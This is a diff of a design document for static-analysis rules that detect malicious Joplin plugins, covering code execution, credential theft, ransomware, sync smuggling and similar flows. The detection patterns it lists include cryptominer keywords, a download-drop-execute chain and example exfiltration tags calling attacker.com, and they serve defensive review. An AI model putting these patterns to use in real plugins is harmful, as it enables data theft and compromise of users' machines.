@@ -1,451 +1,479 @@
 # Rule 1 : Dynamic Code Execution
 
-  Detects dynamic code execution from remote sources. Covers both "fetch remote code" and "receive code via event" entry points. Flags cases where
-  untrusted/remote content is executed as code rather than treated as data.
+Detects remote content executed as code rather than treated as data.
 
-  ### Flows :
+### Flows :
 
-  Any of the following remote network sources:
-  - `fetch()`, `axios.get()`, `http.get()`, `https.get()`, `got()`, `superagent()`
-  - `"message"`/`"data"` event listener callbacks (parameter 0)
+Sources:
 
-  Flowing into any of the following code execution sinks:
-  - `eval()` argument
-  - `new Function()` argument
-  - `setTimeout()` / `setInterval()` first argument (string-as-code form)
-  - `vm.runInNewContext()` / `vm.Script()` / `vm.compileFunction()` argument
+- `fetch()` / `axios.get()` / `axios.post()` / `axios()` / `http.get()` / `https.get()` / `got()` / `superagent()`
+- `"message"` / `"data"` event listener parameter
+- `joplin.data.userDataGet()` (smuggled payload — links to Rule 12)
 
-  ### Messages :
+Sinks:
 
-  Remote data flows to dynamic code execution (e.g., `eval`, `setTimeout`, or `Function`). 
-**Reviewer Action:** Verify if the endpoint is a trusted Joplin service or a remote server. If code execution is intended, check for strict code signing, content-hash validation, or sandboxing to ensure an attacker cannot inject arbitrary payloads via the network.
+- `eval()` / `new Function()` / `Function()` (without `new`)
+- `setTimeout()` / `setInterval()` first argument (string form)
+- `vm.runInNewContext()` / `vm.runInThisContext()` / `vm.runInContext()` / `vm.compileFunction()` / `new vm.Script()`
 
-  ### Severity : error
+### Messages :
+
+Remote data flows to dynamic code execution.  
+**Reviewer Action:** Verify endpoint is a trusted Joplin service. If execution is intended, require code signing and content-hash validation.
+
+### Severity : error
 
 # Rule 2 : Secret and Key Theft
 
-  Detects Joplin's internal sensitive settings (sync cache, master password, API tokens, cached encryption keys) flowing into exfiltration-capable sinks.
+Detects Joplin's internal sensitive settings (sync cache, master password, API tokens, cached encryption keys) flowing into exfiltration-capable sinks.
 
-  ### Flows :
+### Flows :
 
-  Sensitive settings tracked: `api.token`, `encryption.masterPassword`, `encryption.cachedPpk`, `encryption.passwordCache`, `syncInfoCache`, `sync.*.password`, `sync.*.auth`, `sync.*.context`, `sync.*.userEmail`, `sync.userId`, `clientId`.
+Sensitive settings tracked: `api.token`, `encryption.masterPassword`, `encryption.cachedPpk`, `encryption.passwordCache`, `syncInfoCache`, `sync.*.password`, `sync.*.auth`, `sync.*.context`, `sync.*.userEmail`, `sync.userId`, `clientId`.
 
-  1.  joplin.settings.globalValue(sensitive setting)  -> network sink (fetch/axios/http/WebSocket)
-  2.  joplin.settings.globalValue(sensitive setting)  -> filesystem path sink (writeFile/rename/unlink path argument)
-  3.  joplin.settings.globalValue(sensitive setting)  -> filesystem data sink (writeFile content argument)
-  4.  joplin.settings.globalValue(sensitive setting)  -> command execution sink (child_process argument)
-  5.  joplin.settings.globalValue(sensitive setting)  -> Joplin-specific sink (`joplin.data.put`, `panels.setHtml`, `contentScripts.register`, `joplin.data.userDataSet`)
-  6. Same flows via  globalValues()  array form.
+1.  joplin.settings.globalValue(sensitive setting) -> network sink (fetch/axios/http/WebSocket)
+2.  joplin.settings.globalValue(sensitive setting) -> filesystem path sink (writeFile/rename/unlink path argument)
+3.  joplin.settings.globalValue(sensitive setting) -> filesystem data sink (writeFile content argument)
+4.  joplin.settings.globalValue(sensitive setting) -> command execution sink (child_process argument)
+5.  joplin.settings.globalValue(sensitive setting) -> Joplin-specific sink (`joplin.data.put`, `panels.setHtml`, `contentScripts.register`, `joplin.data.userDataSet`)
+6.  Same flows via globalValues() array form.
 
-  ### Messages :
+### Messages :
 
-  Critical Security Alert: Sensitive configuration data (such as a master password, sync cache, encryption keys, or API tokens) is flowing directly to an external or untrusted sink. 
+Critical Security Alert: Sensitive configuration data (such as a master password, sync cache, encryption keys, or API tokens) is flowing directly to an external or untrusted sink.
 **Reviewer Action:** This is highly suspicious behavior. Confirm whether the plugin has a legitimate, fully disclosed reason to touch credentials. Ensure this data is never exposed to network logs, user-interface text panels, or unencrypted local cache files.
 
-  ### Severity : error
+### Severity : error
 
-   # Rule 3 : Unauthorized FS Access / Self-Modification
+# Rule 3 : Unauthorized FS Access / Self-Modification
 
-  Detects filesystem-path-revealing sources (process.cwd, __dirname) flowing into destructive/path-based fs operations, skipping whitelisted safe sandbox
-  destinations.
+Filesystem access outside the plugin sandbox, or self-modification after install.
 
-  ### Flows :
+### Flows :
 
-  1.  __dirname  /  __filename  -> filesystem path sink (writeFile/rm/etc.)
-  2.  process.cwd()  -> filesystem path sink
-  3.  app.getPath()  /  require('electron').app.getPath()  -> filesystem path sink
-  4.  os.homedir()  -> filesystem path sink
-  5.  path.resolve()  /  path.join()  -> filesystem path sink
-  6.  require("fs")  /  import fs  /  joplin.require("fs")  (or fs-extra) module reference -> filesystem path sink
+1. `__dirname` / `__filename` -> `writeFile` / `rm` / `unlink` / `rename` / `copyFile` path argument
+2. `process.cwd()` -> filesystem path sink
+3. `app.getPath()` / `electron.app.getPath()` -> filesystem path sink
+4. `os.homedir()` / `os.tmpdir()` -> filesystem path sink
+5. `path.join(__dirname, ...)` / `path.resolve(__dirname, ...)` -> filesystem path sink
+6. **Self-modification**: `__dirname` + `index.js` / `main.js` / `plugin.js` -> `writeFile` / `writeFileSync`
+7. **Config targeting**: any path source -> sink where path contains `.config/joplin-desktop` / `database.sqlite` / `.ssh`
 
-  ### Messages :
+### Notes :
 
-  Unauthorized File System Access: The plugin is using path-revealing variables (like `__dirname` or `process.cwd`) to write, modify, or delete files outside of the safe Joplin sandbox. 
-**Reviewer Action:** Plugins must exclusively use `joplin.plugins.dataDir()` for file storage. Reject this if it is attempting to modify the plugin's own source files or blindly access the user's broader OS file system.
+- Flow 6 (bare `require("fs")` as source) removed — module import is a capability not a source, causes massive false positives on any legitimate fs-using plugin.
+- Whitelist: flows where path is derived from `joplin.plugins.dataDir()` should be excluded.
+- `fs-extra` destructive methods (`outputFile`, `move`, `emptyDir`) should be included as sinks alongside native `fs`.
 
-  ### Severity : error
+### Messages :
 
-   # Rule 4 : Network Backdoor
+Unauthorized File System Access: Plugin uses path-revealing variables to write or delete files outside the Joplin sandbox.  
+**Reviewer Action:** Plugins must use `joplin.plugins.dataDir()` exclusively. Self-modification of `index.js`/`main.js` post-install is confirmed malicious.
 
-  Detects server-creation objects flowing into a receiver of  .listen() / .bind() / .start()  to open a local port.
+### Severity : error
 
-  ### Flows :
+# Rule 4 : Network Backdoor
 
-  1.  net.createServer()  /  http.createServer()  /  https.createServer()  /  tls.createServer()  result -> receiver of  .listen()  call
-  2.  dgram.createSocket()  result -> receiver of  .bind()  call
-  3.  new ws.Server(...)  instance -> receiver of  .listen() / .start()  call
-  4.  express()  /  koa()  /  fastify()  app instance -> receiver of  .listen()  call
+Detects server-creation objects flowing into a receiver of .listen() / .bind() / .start() to open a local port.
 
-  ### Messages :
+### Flows :
 
-  Network Backdoor Detected: The plugin is opening a local listening port (via `net`, `http`, or frameworks like `Express`) to accept incoming connections. 
+1.  net.createServer() / http.createServer() / https.createServer() / tls.createServer() result -> receiver of .listen() call
+2.  dgram.createSocket() result -> receiver of .bind() call
+3.  new ws.Server(...) instance -> receiver of .listen() / .start() call
+4.  express() / koa() / fastify() app instance -> receiver of .listen() call
+
+### Messages :
+
+Network Backdoor Detected: The plugin is opening a local listening port (via `net`, `http`, or frameworks like `Express`) to accept incoming connections.
 **Reviewer Action:** Check if the plugin explicitly advertises running a local server (e.g., a companion web app). If this is undocumented, it acts as a backdoor. Verify that the server binds securely (e.g., localhost only) and requires explicit authentication.
 
-  ### Severity : error
+### Severity : error
 
-   # Rule 5 : Clipboard Hijacking
+# Rule 5 : Clipboard Hijacking
 
-  Detects clipboard content being read out and/or replaced with externally-sourced or arbitrary string data.
+Clipboard content read, replaced, or exfiltrated silently.
 
-  ### Flows :
+### Flows :
 
-  1.  joplin.clipboard.readText()  -> argument of  clipboard.writeText() / writeHtml()
-  2.  fetch()  call result -> argument of  clipboard.writeText() / writeHtml()
-  3. Any string literal -> argument of  clipboard.writeText() / writeHtml()
-  4.  joplin.clipboard.readText()  -> network exfiltration sink
+1. `joplin.clipboard.readText()` -> `clipboard.writeText()` / `writeHtml()` (read-then-replace)
+2. `fetch()` / `axios` / remote source -> `clipboard.writeText()` / `writeHtml()` (inject remote payload)
+3. `joplin.clipboard.readText()` -> network exfiltration sink (exfiltration)
+4. `joplin.clipboard.readText()` inside `setInterval` / unbounded loop (background polling)
+5. `clipboard.writeText()` inside `setInterval` (continuous silent replacement)
+6. `joplin.clipboard.readText()` -> `eval()` / `child_process` (clipboard content executed)
 
-  ### Messages :
+### Notes :
 
-  Clipboard Hijacking Risk: The plugin is reading the user's clipboard and replacing it with arbitrary external data or hardcoded strings. 
-**Reviewer Action:** Verify that this is triggered by a deliberate user action (like clicking a "Copy" button). If this happens silently in the background, it may be attempting to swap copied text (e.g., injecting cryptocurrency wallet addresses or malicious URLs).
+- Flow 3 (any string literal -> writeText) removed — fires on every copy-to-clipboard feature, unusable noise.
 
-  Clipboard Exfiltration Risk: The plugin is reading the user's clipboard and sending the contents over the network. 
-**Reviewer Action:** This is a severe privacy violation. Verify why the plugin needs to transmit clipboard contents and ensure the user explicitly authorized this data transfer.
+### Messages :
 
-  ### Severity : error
+Clipboard Hijacking: Plugin reads and replaces clipboard with remote or arbitrary data.  
+**Reviewer Action:** Verify triggered by explicit user action. Silent background replacement may inject malicious wallet addresses or URLs.
 
-   # Rule 6 : Native Binary Dropping & Cryptojacking
+Clipboard Exfiltration: Plugin reads clipboard and transmits contents over network.  
+**Reviewer Action:** Severe privacy violation. Verify explicit user consent.
 
-  Detects remote data or known cryptominer keywords flowing into a command-execution sink, with severity escalation if  {shell: true}  is passed.
+### Severity : error
 
-  ### Flows :
+# Rule 6 : Native Binary Dropping & Cryptojacking
 
-  1.  fetch()  call result -> command execution sink (child_process argument)
-  2. String literal matching xmrig/minerd/ethminer/cgminer/t-rex/nsfminer/pool/stratum+tcp -> command execution sink
-  3. (Escalation)  spawn() / execFile()  options contains  {shell: true}
+Remote payloads or cryptominer keywords flowing into command execution.
 
-  ### Messages :
+### Flows :
 
-  High-Risk Execution: The plugin is downloading external payloads or contains hardcoded keywords associated with cryptominers, and passing them directly to a system terminal command. 
-**Reviewer Action:** This is a severe threat indicator. Immediately audit the command payload to ensure it is not silently installing malware or hijacking CPU resources.
+1. `fetch()` / `axios` / `http.get()` / `got()` result -> `child_process` argument
+2. String literal matching `xmrig` / `minerd` / `ethminer` / `cgminer` / `t-rex` / `nsfminer` / `stratum+tcp` / `pool.` / `nicehash` -> command execution sink
+3. Remote source -> `fs.writeFileSync()` + `fs.chmodSync("+x")` + `child_process.exec()` (download-drop-execute chain)
+4. (Escalation): any of above with `{shell: true}` in `spawn()` / `execFile()` options
 
-  [ELEVATED SEVERITY] High-Risk Execution: The plugin is passing external payloads or cryptominer keywords to a system terminal command with `shell: true`. 
-**Reviewer Action:** This is a critical threat indicator. The use of `shell: true` means this input is interpreted by a shell environment and is significantly easier to weaponize. Immediately audit the command payload for malware or resource hijacking.
+### Messages :
 
-  ### Severity : error
+High-Risk Execution: Plugin downloads external payload or contains cryptominer keywords passed to a terminal command.  
+**Reviewer Action:** Audit command payload for silent malware install or CPU hijacking.
 
-  #  Rule 7 : Command Execution
+[ELEVATED] High-Risk Execution: Same as above with `{shell: true}` — input is shell-interpreted, trivially weaponizable.  
+**Reviewer Action:** Critical finding. Reject unless fully justified.
 
-  A residual catch-all detecting non-sensitive settings, note data reads, selected notes, and generic parameters flowing into a command execution sink.
+### Severity : error
 
-  ### Flows :
+# Rule 7 : Command Execution (Catch-All)
 
-  1.  joplin.settings.globalValue()  (where setting is NOT sensitive) -> command execution sink
-  2.  joplin.data.get()  -> command execution sink
-  3.  joplin.workspace.selectedNote()  -> command execution sink
-  4. Any function parameter -> command execution sink
-  5. Any string literal NOT matching miner keywords -> command execution sink
+Residual command execution detection for flows not covered by Rules 2 or 6.
 
-  ### Messages :
+### Flows :
 
-  Terminal Command Execution: The plugin is passing generic string data or Joplin settings into a system terminal command (`child_process`). 
-**Reviewer Action:** Note: this is the broadest, lowest-specificity command-execution check — cross-reference with Rule 2 (Secret Theft) and Rule 6 (Cryptojacking) if this same call also appears there. Review the executed command to ensure the inputs are properly sanitized against command injection.
+1. `joplin.settings.globalValue()` (non-sensitive setting) -> command execution sink
+2. `joplin.data.get()` -> command execution sink
+3. `joplin.workspace.selectedNote()` -> command execution sink
+4. `joplin.data.userDataGet()` -> command execution sink (smuggled payload — links Rule 12)
+5. User-controlled function parameter -> command execution sink
+6. String literal (non-miner) -> command execution sink
 
-  ### Severity : warning
+### Notes :
 
-   # # Rule 8 : Data Exfiltration
+- Explicitly exclude flows already fired by Rule 2 (sensitive settings) and Rule 6 (miner keywords) to suppress duplicate alerts.
+- Flow 5 scoped to user-controlled parameters only — bare "any function parameter" fires on every plugin using `child_process` legitimately.
 
-  Detects bulk-reading notes or resources and piping the full-list data into network requests.
+### Messages :
 
-  ### Flows :
+Terminal Command Execution: Generic data or Joplin settings passed to `child_process`.  
+**Reviewer Action:** Lowest-specificity check — cross-reference Rule 2 and Rule 6. Verify inputs are sanitized against command injection.
 
-  1.  joplin.data.get(["notes"])  (no ID, full list) -> network exfiltration sink
-  2.  joplin.data.get(["folders"])  (no ID, full list) -> network exfiltration sink
-  3.  joplin.data.get(["resources"])  (no ID, full list) -> network exfiltration sink
-  4.  joplin.workspace.selectedNote()  -> network exfiltration sink
+### Severity : warning
 
-  ### Messages :
+# Rule 8 : Data Exfiltration
 
-  Data Exfiltration Warning: The plugin is executing a bulk-read of notes, folders, or resources, and immediately sending that data to an external network request. 
-**Reviewer Action:** Check if the plugin is a legitimate sync/export tool. If not, this is a massive privacy breach. Verify exactly what data is being sent in the payload and ensure the destination server is trusted and expected by the user.
+Bulk-reading notes/resources and piping to network sinks.
 
-  ### Severity : error
+### Flows :
 
-   # Rule 9 : Mass Encryption / Ransomware
+1. `joplin.data.get(["notes"])` (full list) -> network exfiltration sink
+2. `joplin.data.get(["folders"])` (full list) -> network exfiltration sink
+3. `joplin.data.get(["resources"])` (full list) -> network exfiltration sink
+4. `joplin.data.get(["master_keys"])` -> network exfiltration sink
+5. `joplin.workspace.selectedNote()` -> network exfiltration sink
+6. `joplin.data.get(["notes", id])` (single targeted read) -> network sink
 
-  Three-stage taint tracking connecting note reads to encryption algorithms and then back to Joplin data overwrites via same-note correlation.
+### Messages :
 
-  ### Flows :
+Data Exfiltration Warning: The plugin is bulk-reading notes, folders, or resources and sending that data to an external network endpoint.  
+**Reviewer Action:** Verify the plugin is a legitimate sync/export tool. Confirm destination server is trusted and user-disclosed.
 
-  1.  joplin.data.get() / selectedNote()  -> argument of  cipher.update() / encrypt()
-  2. Encryption call result -> argument of  joplin.data.put()
-  3. Same-note correlation 1: Read source itself flows into the ID slot of the write call's path
-  4. Same-note correlation 2: Read call's ID matches the write call's ID exactly
+### Severity : warning
 
-  ### Messages :
+# Rule 9 : Mass Encryption / Ransomware
 
-  Ransomware Pattern Detected: The plugin is reading Joplin notes, passing them through an encryption cipher, and overwriting the original notes. 
-**Reviewer Action:** Unless this plugin is explicitly designed as an end-to-end encryption tool, this behavior mimics ransomware. Verify that the user holds the decryption keys locally and that this action is strictly opt-in.
+Three-stage taint tracking connecting note reads → encryption → Joplin data overwrites.
 
-  ### Severity : warning
+### Flows :
 
-   # Rule 10 : Silent Backup Hijacking (Taint + Structural)
+1. `joplin.data.get()` / `selectedNote()` -> `cipher.update()` / `encrypt()` / `crypto.createCipheriv()` / `crypto.createCipher()`
+2. Encryption result -> `joplin.data.put()` body argument (overwrite)
+3. Same-note correlation: read source ID matches write path ID
+4. **Encryption key -> network exfiltration sink** (ransom key exfil — confirms malicious intent)
+5. Above flows inside a loop over all notes (bulk/mass ransomware variant)
 
-  Detects data from an export module flowing into a network, child_process, or unauthorized file system sink (bypassing the legitimate export path).
+### Messages :
 
-  ### Flows :
+Ransomware Pattern Detected: Notes are being read, encrypted, and overwritten in-place.  
+**Reviewer Action:** Verify the user holds decryption keys locally and action is strictly opt-in. If encryption key flows to a network sink, treat as confirmed ransomware.
 
-  1.  onProcessItem / onProcessResource  parameters -> network exfiltration sink
-  2.  onInit / onClose  context parameter -> network exfiltration sink
-  3. Any of the above source parameters -> command execution sink
-  4. Any of the above source parameters -> file-write data sink (ONLY IF destination path is NOT tainted by context)
-  5. (Structural Variant): Any network/exec/file-write call lexically inside a  registerExportModule  callback.
+### Severity : warning (encryption only) / error (encryption + key exfil)
 
-  ### Messages :
+# Rule 10 : Silent Backup Hijacking (Taint + Structural)
 
-  [High Confidence] Backup Hijacking Alert: Export data is confirmed flowing into a network request, terminal command, or unauthorized file path instead of the legitimate export destination. 
+Detects data from an export module flowing into a network, child_process, or unauthorized file system sink (bypassing the legitimate export path).
+
+### Flows :
+
+1.  onProcessItem / onProcessResource parameters -> network exfiltration sink
+2.  onInit / onClose context parameter -> network exfiltration sink
+3.  Any of the above source parameters -> command execution sink
+4.  Any of the above source parameters -> file-write data sink (ONLY IF destination path is NOT tainted by context)
+5.  (Structural Variant): Any network/exec/file-write call lexically inside a registerExportModule callback.
+
+### Messages :
+
+[High Confidence] Backup Hijacking Alert: Export data is confirmed flowing into a network request, terminal command, or unauthorized file path instead of the legitimate export destination.
 **Reviewer Action:** Verify if the plugin is quietly siphoning off backup data during a user-initiated export. Ensure all exported data strictly writes to the context's designated safe destination path.
 
-  [Low Confidence] Backup Hijacking Indicator: A network, execution, or file-write call exists lexically inside an export callback, but direct data flow isn't confirmed by taint tracking. 
+[Low Confidence] Backup Hijacking Indicator: A network, execution, or file-write call exists lexically inside an export callback, but direct data flow isn't confirmed by taint tracking.
 **Reviewer Action:** Manual trace required. Verify if the execution/network call is legitimately part of the export process or if it is acting as a blind trigger/exfiltration vector.
 
-  ### Severity : error (Taint) / warning (Structural)
+### Severity : error (Taint) / warning (Structural)
 
-  #  Rule 11 : Remote Webview Scripts (Taint + Structural)
+# Rule 11 : Remote Webview Scripts (Taint + Structural)
 
-  Detects creating a webview or content script with an external remote URL dynamically (excluding safe localhost/local files).
+Detects webviews or content scripts loading external URLs or leaking data via src attributes.
 
-  ### Flows :
+### Flows :
 
-  1.  fetch()  response ->  setHtml()  /  dialogs.setHtml()  HTML argument (containing  <script/> / <iframe/> / <img/> )
-  2.  axios.get()  /  process.env  /  settings  ->  setHtml()  HTML argument
-  3. Hardcoded external URL string literal ->  setHtml()  HTML argument
-  4. Same sources ->  contentScripts.register()  third argument
-  5. URL Smuggling:  joplin.data.get()  /  joplin.settings.globalValue()  ->  setHtml()  HTML argument (containing a  src  attribute)
-  6. (Structural Variant): Any  setHtml()  or  contentScripts.register()  regardless of source.
+1. `fetch()` / `axios` / `http.get()` / `got()` response -> `setHtml()` / `dialogs.setHtml()` (containing `<script>` / `<iframe>` / `<img>`)
+2. `process.env` / `joplin.settings` -> `setHtml()` HTML argument
+3. Hardcoded external URL string literal -> `setHtml()` / `contentScripts.register()` third argument
+4. URL Smuggling: `joplin.data.get()` / `joplin.settings.globalValue()` -> `setHtml()` containing `src` attribute
+5. Missing: `<meta http-equiv="refresh" content="0;url=https://attacker.com">` in `setHtml()` (redirect exfil)
+6. (Structural): Any `setHtml()` / `contentScripts.register()` call — very low confidence, high noise
 
-  ### Messages :
+### Messages :
 
-  Remote Webview Injection: The plugin is dynamically loading an external, remote URL into a Webview (via iframe or script tags) or registering a remote Content Script. 
-**Reviewer Action:** Confirm the URL points to a trusted, known-good domain (like a CDN or official docs). Loading unverified remote scripts allows an attacker to bypass plugin updates and dynamically execute malicious UI code.
+Remote Webview Injection: External URL injected into a Webview or Content Script.  
+**Reviewer Action:** Confirm URL is trusted. Unverified remote scripts bypass plugin updates and execute arbitrary UI code.
 
-  URL Smuggling: Sensitive data (note content or settings) flows directly into a Webview URL or HTML payload.
-**Reviewer Action:** Verify that sensitive user data is not being appended as query parameters to external image tags (`<img src=".../?data=SECRET">`) or remote iframes, which silently exfiltrates the data to external server logs.
+URL Smuggling: Sensitive data flows into a Webview `src` attribute, silently exfiltrating to external server logs via `<img src="attacker.com/?data=SECRET">`.  
+**Reviewer Action:** Verify no sensitive data is appended as query parameters to remote tags.
 
-  ### Severity : warning
+### Severity : warning
 
-  #  Rule 12 : Sync Smuggling (Intra-API Exfiltration)
+### Notes :
 
-  Exfiltrating sensitive user data by smuggling it into internal  userDataSet  sync values.
+- Flow 6 structural variant should be gated as `@problem.severity recommendation` — fires on every panel-using plugin.
+- `contentScripts.register()` third argument index unverified against real Joplin API.
 
-  ### Flows :
+# Rule 12 : Sync Smuggling (Intra-API Exfiltration)
 
-  1.  joplin.data.get(["notes", id])  -> any argument of  joplin.data.userDataSet()
-  2.  joplin.data.get(["folders"|"resources"|"master_keys", id])  -> any argument of  userDataSet()
+Exfiltrating data via hidden userDataSet sync values or executing smuggled payloads.
 
-  ### Messages :
+### Flows :
 
-  Sync Smuggling Attempt: Sensitive note, folder, or key data is being copied and hidden inside a note's invisible `userDataSet` property. 
-**Reviewer Action:** This is a stealth exfiltration technique. Verify why the plugin needs to duplicate sensitive content into hidden metadata fields that the user cannot easily inspect.
+1. `joplin.data.get(["notes"|"folders"|"resources"|"master_keys", id])` -> `joplin.data.userDataSet()` (smuggling in)
+2. `joplin.data.userDataGet()` -> `eval()` / `new Function()` / `child_process` / `vm` (smuggled execution)
+3. `joplin.data.userDataGet()` -> network exfiltration sink (smuggled exfiltration)
+4. `joplin.data.get(["notes"])` bulk read -> `userDataSet()` (mass note content hidden in metadata)
 
-  Sync Smuggling Execution: Hidden `userDataSet` content is being read out of the database and flowing directly into an execution or network sink.
-**Reviewer Action:** This is highly dangerous. It indicates the plugin is reading payloads that were smuggled into the sync engine and executing them, serving as a stealthy Remote Code Execution (RCE) or exfiltration trigger.
+### Messages :
 
-  ### Severity : error
+Sync Smuggling (Write): Sensitive note or key data is being copied into a note's invisible `userDataSet` metadata — a stealth exfiltration channel that syncs silently across devices.  
+**Reviewer Action:** Verify why the plugin duplicates sensitive content into hidden metadata the user cannot inspect.
 
-  #  Rule 13 : Social Engineering & UI Phishing
+Sync Smuggling (Execute): Hidden `userDataSet` content is being read and passed to an execution or network sink — indicating a stealthy RCE or exfiltration trigger.  
+**Reviewer Action:** This is a critical finding. A plugin may be using sync as a C2 channel to receive and execute remote commands.
 
-  Spoofing internal authentication interfaces to harvest credentials.
+### Severity : error
 
-  ### Flows :
+# Rule 13 : Social Engineering & UI Phishing
 
-  1. Joplin dialog submission / prompt result -> network exfiltration sink
+Spoofing authentication interfaces to harvest credentials.
 
-  ### Messages :
+### Flows :
 
-  UI Phishing Indicator: Data submitted through a custom Joplin dialog or prompt is being transmitted to an external network. 
-**Reviewer Action:** Review the HTML of the dialog. Ensure it is not mimicking an official Joplin authentication screen or asking for external service credentials (like GitHub or Dropbox) over an untrusted connection.
+1. `joplin.views.dialogs.setHtml()` containing `<input type="password">` / fake branding -> form submission -> network exfiltration sink
+2. `joplin.views.dialogs.open()` result -> network exfiltration sink
+3. `panels.onMessage()` callback (capturing form data) -> network exfiltration sink
+4. Any dialog HTML containing keywords: `"password"`, `"token"`, `"dropbox"`, `"github"`, `"onedrive"` -> network sink
 
-  ### Severity : error
+### Messages :
 
- #   Rule 14 : Asynchronous Tag Flooding & Search Poisoning
+UI Phishing Indicator: Data submitted through a custom Joplin dialog is being transmitted to an external network endpoint.  
+**Reviewer Action:** Review dialog HTML for `<input type="password">`, fake Joplin/provider branding, or credential field names. Legitimate plugins never need to harvest sync provider passwords — those are managed exclusively by Joplin core.
 
-  Sabotaging application indexing via programmatic high-volume metadata inflation using unbounded loops.
+### Severity : error
 
-  ### Flows :
+# Rule 14 : Resource Exhaustion & Quota DoS
 
-  1.  joplin.data.post(["tags"|"notes"|"resources", ...])  inside an unbounded  setInterval  (no  clearInterval )
-  2.  joplin.data.post()  inside a synchronous  for / while / do-while  loop statement
+Sabotaging application indexing via unbounded programmatic entity creation.
 
-  ### Messages :
+### Flows :
 
-  Resource Exhaustion (Flooding): The plugin is rapidly creating tags, notes, or resources inside an unbounded background interval or synchronous loop. 
-**Reviewer Action:** This can destroy Joplin's search index and exhaust storage quotas. Confirm the loop is strictly bounded by a finite limit (e.g., iterating only over user-selected notes) and is not infinite.
+1. `joplin.data.post(["tags"|"notes"|"resources", ...])` inside unbounded `setInterval` (no `clearInterval`)
+2. `joplin.data.post()` inside `for` / `while` / `do-while` / recursive `setTimeout`
+3. `fs.writeFileSync()` generating large binary blobs inside any loop (disk quota exhaustion)
+4. `joplin.data.post(["tags"])` chained immediately to `joplin.data.post(["tags", id, "notes"])` in a loop (tag-to-note link flooding, search index corruption)
 
-  ### Severity : warning
+### Messages :
 
- #   Rule 15 : Semantic Integrity Sabotage (Gaslighting)
+Resource Exhaustion (Flooding): The plugin is rapidly creating tags, notes, resources, or large files inside an unbounded loop or background interval.  
+**Reviewer Action:** This can corrupt Joplin's search index and exhaust disk/cloud storage quotas. Confirm the loop is strictly bounded by a finite, user-controlled limit and is not infinite or attacker-controlled.
 
-  Silently modifying user notes in a malicious or destabilizing manner using hooks.
+### Severity : warning
 
-  ### Flows :
+# Rule 15 : Semantic Integrity Sabotage (Gaslighting)
 
-  1.  workspace.onNoteSelectionChange()  callback body ->  joplin.data.put() / delete()  in the same function
-  2.  workspace.onNoteChange()  /  onNoteContentChange()  callback body ->  joplin.data.put() / delete()  in the same function
+Silently modifying user notes inside workspace event hooks.
 
-  ### Messages :
+### Flows :
 
-  Semantic Sabotage: The plugin is silently modifying or deleting notes directly inside a workspace event hook (like `onNoteSelectionChange`). 
-**Reviewer Action:** Modifying a note the exact moment a user clicks on it is highly suspicious and mimics "gaslighting" malware. Ensure these modifications are expected, visible formatting changes (like an auto-linter), not destructive silent edits.
+1. `workspace.onNoteSelectionChange()` callback -> `joplin.data.put()` / `delete()` in same function
+2. `workspace.onNoteChange()` / `onNoteContentChange()` callback -> `joplin.data.put()` / `delete()` in same function
+3. `workspace.onNoteAlarmTrigger()` callback -> `joplin.data.put()` / `delete()` in same function
+4. Any above hook -> `joplin.commands.execute()` with text-modifying commands (e.g. `insertText`, `replaceSelection`)
 
-  ### Severity : error
+### Messages :
 
-  #  Rule 16 : Electron Main Process Takeover
+Semantic Sabotage: The plugin is silently modifying or deleting notes directly inside a workspace event hook.  
+**Reviewer Action:** Modifying a note the moment a user clicks on it or triggers an alarm mimics "gaslighting" malware (word replacement, date shifting, silent deletion). Ensure modifications are explicit, user-initiated, and visible — not silent background edits.
 
-  Gaining direct access to the main Electron process to control the app window or bypass renderer restrictions.
+### Severity : error
 
-  ### Flows :
+### Notes :
 
-  1.  require("@electron/remote")  or  import ... from "@electron/remote"
-  2.  require("electron").remote  or  import  access to  electron.remote
+- Structural check — fires if call exists lexically inside hook, regardless of condition guards.
+- Indirect flows (hook stores note ID, modification happens later outside hook) require taint tracking and are not covered here.
 
-  ### Messages :
+# Rule 16 : Electron Main Process Takeover
 
-  Critical Violation (Main Process Takeover): The plugin is attempting to import or require `@electron/remote` or `electron.remote`. 
+Gaining direct access to the main Electron process to control the app window or bypass renderer restrictions.
+
+### Flows :
+
+1.  require("@electron/remote") or import ... from "@electron/remote"
+2.  require("electron").remote or import access to electron.remote
+
+### Messages :
+
+Critical Violation (Main Process Takeover): The plugin is attempting to import or require `@electron/remote` or `electron.remote`.
 **Reviewer Action:** This completely bypasses the plugin sandbox and grants full control over the Joplin application window and the OS. This must be strictly prohibited and removed before publishing.
 
-  ### Severity : error
+### Severity : error
 
- #   Rule 16b : Unauthorized Electron API Usage
+# Rule 16b : Unauthorized Electron API Usage
 
-  Direct usage of native Electron APIs bypasses Joplin's sanctioned plugin architecture.
+Direct usage of native Electron APIs bypassing Joplin's plugin architecture.
 
-  ### Flows :
+### Flows :
 
-  1.  require("electron")  /  import "electron"  (bare import)
-  2.  electron.BrowserWindow  /  dialog  /  app  /  clipboard  /  shell  /  ipcRenderer  /  ipcMain  /  screen
+1. `require("electron")` / `import "electron"` (bare import)
+2. `electron.BrowserWindow` / `dialog` / `app` / `clipboard` / `shell` / `ipcRenderer` / `ipcMain` / `screen` / `webContents` / `session` / `protocol`
 
-  ### Messages :
+### Messages :
 
-  Unauthorized Native API Usage: The plugin is importing the raw `electron` module directly. 
-**Reviewer Action:** Direct Electron API usage bypasses Joplin's sanctioned architecture. Verify which property is being accessed (e.g., clipboard, dialog). Instruct the developer to use the equivalent official Joplin API (e.g., `joplin.clipboard`) instead.
+Unauthorized Native API Usage: The plugin is importing the raw `electron` module directly.  
+**Reviewer Action:** Direct Electron API usage bypasses Joplin's sanctioned architecture. `ipcMain`/`ipcRenderer` enables main-process takeover; `session`/`protocol` enables request interception; `webContents` enables arbitrary script injection. Instruct the developer to use official Joplin API equivalents where available.
 
-  ### Severity : warning
+### Severity : warning
 
- #   Rule 17a : Untrusted Archive Extraction
+# Rule 17a : Untrusted Archive Extraction
 
-  Extracting untrusted archives from the network can lead to malicious file overwrites.
+Extracting remotely-fetched archives without validation.
 
-  ### Flows :
+### Flows :
 
-  1.  fetch() / axios.get()  response ->  writeFile() / writeFileSync()  data argument
-  2. That write call's path argument correlates with  archiveExtract() 's sourcePath argument
+1. `fetch()` / `axios` / `http.get()` / `got()` response -> `writeFile()` / `writeFileSync()` -> `archiveExtract(sourcePath)`
+2. Remote response -> `archiveExtract()` sourcePath directly (in-memory, no write step)
+3. User-controlled input -> `archiveExtract()` sourcePath (attacker supplies archive path)
 
-  ### Messages :
+### Messages :
 
-  Unsafe Archive Extraction: An archive downloaded directly from the network is being extracted onto the local disk. 
